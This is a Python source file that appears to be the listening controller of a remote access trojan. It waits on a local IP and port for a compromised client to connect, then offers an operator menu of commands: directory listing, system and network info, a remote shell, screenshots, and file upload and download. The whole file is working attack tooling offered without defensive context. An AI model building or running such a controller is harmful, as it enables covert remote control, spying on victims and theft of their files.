import socket
import commandshell
import fileupload
import filedownload
# hi
# Constants
HOST = '192.168.1.2'
PORT = 1338
MENU = """
1) List CWD
2) System info
3) Network info
4) Shell
5) Take desktop screenshot (For Windows Only)
6) Get current working directory
7) Upload a file
8) Download a file
00) exit
"""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)
print("[*] Waiting for client connection...")
connection, address = s.accept()
print("Type help for menu")
print(MENU)

while True:
    option = input(HOST + "$ ")

    if 'help' in option:
        print(MENU)
        continue
    elif '?' in option:
        print(MENU)
        continue
    
    elif option == '00':
        connection.send("00".encode())
        break

    elif option == '1':
        cmd_path = '1 ' + input("Enter system path: ")
        connection.send(cmd_path.encode())
    
    elif option == '2':
        connection.send('2'.encode())

    elif option == '3':
        connection.send('3'.encode())

    elif option == '4':
        connection.send('4'.encode())
        commandshell.shell(connection)

    elif option == '5':
        connection.send('5'.encode())
        continue
    elif option == '6':
        connection.send('6'.encode())

    elif option == '7':
        file = input("Enter file name: ")
        cmd_file = '7 ' + file
        connection.send(cmd_file.encode())
        fileupload.Upload(connection, file)

    elif option == '8':
        cmd_filename = '8 ' + input("Enter file name: ")
        connection.send(cmd_filename.encode())
    
    elif not option:
        print("Input Error")
        continue
    
    else:
        connection.send("00".encode())
        break
    response = connection.recv(4096).decode()

    print(response)

connection.close()